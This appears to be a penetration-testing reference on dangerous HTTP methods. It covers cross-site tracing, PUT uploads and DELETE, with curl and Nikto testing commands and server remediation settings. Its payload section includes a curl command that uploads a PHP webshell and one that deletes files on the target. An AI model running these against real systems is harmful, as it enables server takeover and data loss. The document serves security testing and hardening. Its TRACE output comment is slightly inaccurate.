# Dangerous HTTP Methods (TRACE, PUT, DELETE)

## Overview
Web servers often have unnecessary HTTP methods enabled that are not used by the application. `TRACE` enables Cross-Site Tracing (XST) attacks that can steal cookies even with `HttpOnly` set. `PUT` can allow arbitrary file upload to the server. `DELETE` can allow file deletion. These methods should be explicitly disabled unless specifically required.

## How It Works
- `TRACE`: Echoes the request back to the client — including HTTP headers like cookies, Authorization headers. A malicious page can use `XMLHttpRequest` TRACE to steal `HttpOnly` cookies (Cross-Site Tracing / XST).
- `PUT`: Historically used by WebDAV — can allow uploading files directly to web-accessible directories.
- `DELETE`: Can remove server-side files.
- `OPTIONS`: Reveals which methods are supported (use for enumeration).
- `CONNECT`: Can establish a tunnel through a proxy — dangerous if unrestricted.

## Impact
- TRACE → XST: Stealing HttpOnly session cookies via JavaScript (bypasses HttpOnly protection).
- PUT → Remote file upload: Upload a webshell directly to the server.
- DELETE → Data destruction: Remove application files or content.
- CONNECT → Proxy tunneling: Using the server as a proxy.

## Where to Look
- Any HTTP endpoint — test with `OPTIONS` to enumerate allowed methods.
- WebDAV-enabled directories (common on SharePoint, IIS with WebDAV).
- REST APIs where DELETE/PUT are enabled globally rather than per-resource.
- Admin interfaces that may have more methods available.

## Testing Steps
1. Send `OPTIONS /` request and inspect `Allow:` response header.
2. Try `TRACE /` and check if the request is echoed back (200 = enabled).
3. Try `PUT /evil.txt` with `Content-Type: text/plain` and some test content.
4. Check if the file was written by issuing a GET request for the same path.
5. For DELETE: attempt `DELETE /test.txt` on a file you just uploaded.
6. Test both root path and specific application paths.

## Payloads / Techniques
```bash
# Enumerate allowed methods
curl -s -X OPTIONS https://target.com/ -D - | grep Allow

# Test TRACE
curl -s -X TRACE https://target.com/ -H "Cookie: session=test123"
# If echoed back: X-Custom-Header: session=test123

# Test PUT - upload a test file
curl -s -X PUT https://target.com/test.txt \
  -H "Content-Type: text/plain" \
  -d "test content"

# Verify if file was uploaded
curl -s https://target.com/test.txt

# Upload a PHP webshell via PUT
curl -s -X PUT https://target.com/shell.php \
  -H "Content-Type: text/plain" \
  -d "<?php system(\$_GET['cmd']); ?>"

# Test DELETE
curl -s -X DELETE https://target.com/test.txt

# Test with Nikto
nikto -h https://target.com -Tuning x
```

## Burp Suite Tips
- In **Repeater**, change the HTTP method to `OPTIONS`, `TRACE`, `PUT`, `DELETE` and observe responses.
- **Active Scanner** (Pro) tests for dangerous HTTP methods.
- The **HTTP Method Scanner** in the BApp Store automates method enumeration.
- Check the `Allow:` header in `OPTIONS` responses in the Proxy HTTP History.

## Tools
- curl — method testing
- Nikto — HTTP method enumeration (`-Tuning x`)
- davtest — https://github.com/cldrn/davtest (WebDAV method testing)

## Remediation
- Disable `TRACE` and `TRACK` methods globally on the web server.
  - Apache: `TraceEnable Off`
  - Nginx: `if ($request_method = TRACE) { return 405; }`
  - IIS: Disable via request filtering module
- Only enable PUT/DELETE where specifically needed by the application, restricted to authenticated users.
- Configure the server to return 405 Method Not Allowed for all unlisted methods.
- Use WebDAV-specific configuration to restrict it to authenticated users on specific directories only.

## References
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods
https://portswigger.net/web-security/cors/acao-wildcards
https://owasp.org/www-community/attacks/Cross_Site_Tracing
